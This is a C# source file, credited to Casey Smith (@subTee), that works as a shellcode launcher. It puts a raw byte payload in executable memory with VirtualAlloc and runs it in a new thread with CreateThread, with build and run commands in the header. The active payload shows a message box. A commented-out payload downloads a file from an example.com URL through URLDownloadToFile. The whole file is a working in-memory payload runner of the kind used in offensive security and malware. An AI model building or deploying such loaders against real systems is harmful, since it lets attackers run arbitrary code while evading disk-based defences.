using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

How to compile:
===============
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shellcodeLauncher.exe shellcodeLauncher.cs

PS C:\Users\dvader\Desktop> .\shellcodeLauncher.exe
PS C:\Users\dvader\Desktop> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /out:c:\users\dvader\desktop\shellcodelauncher.exe C:\users\dvader\Desktop\shellcodeLauncher.cs

How to use:
============
c:\> shellcodeLauncher.exe

*/


namespace ShellCodeLauncher
{
    class Program
    {

	

        static void Main()
        {
        
		/*
	    //URLDownloadToFile
	    byte[] shellcode = new byte[60] {
	    
		0x31,0xc0,			//xor eax,eax
		0x50,				//push eax - terminator for fileName
		0x68,0x2e,0x74,0x78,0x74,	//push .txt
		0x68,0x74,0x65,0x73,0x74,	//push text		
		0x89,0xe7,			//mov edi,esp - pointer to fileName
		0x50,				//push eax - terminator for URL
		0x68,0x6f,0x6d,0x20,0x20,	//push om   - with a space
		0x68,0x6c,0x65,0x2e,0x63,	//push le.c	
		0x68,0x78,0x61,0x6d,0x70,	//push xamp
		0x68,0x77,0x77,0x2e,0x65,	//push ww.e
		0x68,0x3a,0x2f,0x2f,0x77,	//push ://w
		0x68,0x68,0x74,0x74,0x70,	//push http
		0x89,0xe1,			//mov ecx,esp - pointer to URL
		0x50,				//push eax - lpfnCB
		0x50,				//push eax - dwReserved
		0x57,				//push edi - pointer to fileName
		0x51,				//push ecx - pointer to URL
		0x50,				//push eax - pCaller
		0xbe,0xd0,0x68,0x57,0x77,	//mov esi, 0x775768d0 - address of URLDownloadToFileA
		0xff,0xd6			//call esi
		
	    };*/
		

	    //MessageBoxA
	    byte[] shellcode = new byte[29] {
		
		0x31,0xc0,			//xor eax,eax
		0x50,				//push eax - terminator
		0x68,0x41,0x41,0x41,0x41,	//push AAAA
		0x89,0xe7,			//mov edi,esp - pointer to lpCaption
		0x50,				//push eax
		0x68,0x41,0x41,0x41,0x41,	//push AAAA
		0x89,0xe3,			//mov ebx,esp - pointer to lpText
		0x50,				//push eax - uType
		0x57,				//push edi - lpCaption
		0x53,				//push ebx - lpText
		0x50,				//push eax - hWnd
		0xbe,0x11,0xea,0xc1,0x75,	//mov esi,0x75c1ea11
		0xff,0xd6,			//call esi - address of MessageBoxA
	
	    };	    
	    



            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;


        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
    }
}
